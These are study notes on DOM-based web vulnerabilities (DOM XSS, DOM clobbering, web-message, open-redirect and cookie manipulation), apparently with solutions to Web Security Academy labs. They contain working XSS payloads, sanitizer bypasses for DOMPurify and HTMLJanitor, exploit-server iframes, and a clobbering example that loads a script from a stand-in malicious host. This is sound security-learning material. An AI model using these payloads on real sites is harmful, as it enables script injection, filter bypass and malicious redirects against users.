# DOM-based vulnerabilities
The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties.
DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink.

- **Sources:** Is a JavaScript property that accepts data that is potentially attacker-controlled. Common sources:
  > document.URL
  > document.documentURI
  > document.URLUnencoded
  > document.baseURI
  > location
  > document.cookie
  > document.referrer
  > window.name
  > history.pushState
  > history.replaceState
  > localStorage
  > sessionStorage
  > IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
  > Database
- **Sink:** Is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it.
  
    | DOM-based vulnerability             | Example sink                  |
    |-------------------------------------|-------------------------------|
    | DOM XSS LABS                        | document.write()              |
    | Open redirection LABS               | window.location               |
    | Cookie manipulation LABS            | document.cookie               |
    | JavaScript injection                | eval()                        |
    | Document-domain manipulation        | document.domain               |
    | WebSocket-URL poisoning             | WebSocket()                   |
    | Link manipulation                   | element.src                   |
    | Web message manipulation            | postMessage()                 |
    | Ajax request-header manipulation    | setRequestHeader()            |
    | Local file-path manipulation        | FileReader.readAsText()       |
    | Client-side SQL injection           | ExecuteSql()                  |
    | HTML5-storage manipulation          | sessionStorage.setItem()      |
    | Client-side XPath injection         | document.evaluate()           |
    | Client-side JSON injection          | JSON.parse()                  |
    | DOM-data manipulation               | element.setAttribute()        |
    | Denial of service                   | RegExp()                      |

## DOM-based document-domain manipulation
The document.domain property is used by browsers in their enforcement of the same origin policy. If two pages from different origins explicitly set the same document.domain value, then those two pages can interact in unrestricted ways. If an attacker can cause a page of a targeted website and another page they control (either directly, or via an XSS-like vulnerability) to set the same document.domain value, then the attacker may be able to fully compromise the target page via the page they already control.

## DOM-based web message manipulation
Web message vulnerabilities arise when a script sends attacker-controllable data as a web message to another document within the browser. An attacker may be able to use the web message data as a source by constructing a web page that, if visited by a user, will cause the user's browser to send a web message containing data that is under the attacker's control.

## DOM clobbering
DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. 

    <script>
        window.onload = function(){
            let someObject = window.someObject || {};
            let script = document.createElement('script');
            script.src = someObject.url;
            document.body.appendChild(script);
        };
    </script>
To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:

    <a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the url property of the `someObject` object, which points to an external script.

Another common technique is to use a `form` element along with an element such as `input` to clobber DOM properties. For example, clobbering the attributes property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the attributes property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out. For example, consider the following injection:

    <body>
        <form onclick="alert()"><input id="attributes" /></form>
    </body>
    <script>
        document.querySelectorAll("form").forEach((form) => {
            for (let i = 0; i < form.attributes.length; i++) {
            let attr = form.attributes[i]; // form.attributes = <input id="attributes">
            if (["onclick", "onmouseover"].includes(attr.name)) {
                form.removeAttribute(attr.name);
            }
            }
        });
    </script>

### LAB: Exploiting DOM clobbering to enable XSS
The `loadCommentsWithDomClobbering.js` will inject `defaultAvatar.avatar` into the `src` attribute of the `<img>`. In order to toggle the `alert()` function we need to manipulate the value of `defaultAvatar.avatar` by using this payload:

     <a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href='cid:"onerror=alert(1)//'></a></a>

Since there are two `<a>` elements with the same `id="defaultAvatar"`, the DOM will create a collection (HTMLCollection) instead of a single element. Accessing `window.defaultAvatar` will return a collection of these elements, not just one:

    HTMLCollection(2) [ <a id="defaultAvatar">, <a id="defaultAvatar" name="avatar" href="cid:'onerror=alert(1)//"> ]

The second anchor tag has `name="avatar"`, which means JavaScript treats it as a property. `window.defaultAvatar.avatar` now resolves to the `href` of the second anchor element.

    'cid:"onerror=alert(1)//'

Notice that the `comment.body` is sanitized by `DOMPurify.sanitize()`. To bypass that, we use `cid:` protocol, which does not URL-encode double-quotes. Therefore, makes it possible for us to break out of the `src` attribute and manipulate the `<img>` tag:

    <img class="avatar" src="cid:" onerror="alert(1)//">

### LAB: Clobbering DOM attributes to bypass HTML filters
Notice the HTMLJanitor parsing input function contains the same flaw as described in the `#DOM clobbering` section. First make use of that and post a comment with this body:

    <form id=x onfocus=print()><input id=attributes/></form>

Next use the exploit server and send this to the victim:

    <iframe src="https://0aac00cb03da876a80efc13d00ed00e4.web-security-academy.net/post?postId=5" onload="setTimeout(()=>{if(this.src.indexOf('#x') == -1) this.src+='#x'}, 500)">

The victim will first view the page that contains the XSS. Then after 500ms the fragment `#x` will be appended to the src and focus on the `<form>` which triggers the `print()` function.

### LAB: DOM XSS using web messages
When the `iframe` loads, the `postMessage()` method sends a web message to the home page and insert it to the DOM:

    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

### LAB: DOM XSS using web messages and a JavaScript URL
Same as above lab but make use of the executing of javascript inside an `href` tag and bypassing the check for the existence of 'http:' or 'https:'.

    <iframe
        id="myIframe"
        src="https://0aba00b00421358080e3f3b800cd00cb.web-security-academy.net/"
        onload="sendMessage()"
    ></iframe>
    <script>
        function sendMessage() {
            document.getElementById('myIframe').contentWindow.postMessage("javascript:print()-'http:';", '*');
        }
    </script>

### LAB: DOM XSS using web messages and JSON.parse
Idea is the same as the above lab.

    <iframe
        src="https://0ad60066038f14938022803200b0008e.web-security-academy.net/"
        onload="sendJSONMessage()"
    ></iframe>
    <script>
        sendJSONMessage = () => {
            const iframe = document.querySelector("iframe");
            const message = {
            type: "load-channel",
            url: "javascript:print()",
            };
            iframe.contentWindow.postMessage(JSON.stringify(message), "*");
        };
    </script>


### LAB: DOM-based open redirection
- Sinks that leads to DOM-based open redirection:
    > location
    > location.host
    > location.hostname
    > location.href
    > location.pathname
    > location.search
    > location.protocol
    > location.assign()
    > location.replace()
    > open()
    > element.srcdoc
    > XMLHttpRequest.open()
    > XMLHttpRequest.send()
    > jQuery.ajax()
    > $.ajax()
- Notice the 'Back to blog' button contains a sink:
`onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'`
- This Regex `/url=(https?:\/\/.+)/.exec(location)` will match anything that starts with `url=http://` or `url=https://`
- Inject the exploit server URL as the parameter and click on the 'Back to blog' button to trigger the redirection: 
`?postId=6&url=https://exploit-0a9b008d03535d23803389b401f60016.exploit-server.net/exploit`

### LAB: DOM-based cookie manipulation
Notice that the value of `document.cookie` (which can be controlled via the `window.location`) is reflected in the `href` attribue of `<a>` in the next page we visit.
Use this script to first set the user to the malicious URL (with the `script` injected) then redirects to another page where the XSS occurs (using `onload` event and the `if` condition to prevent infinite loop):

    <iframe src="https://0a4300c303eb674d801062d20072008c.web-security-academy.net/product?productId=7'><script>print()</script>" onload="if(!window.x)this.src='https://0a4300c303eb674d801062d20072008c.web-security-academy.net/';window.x=1">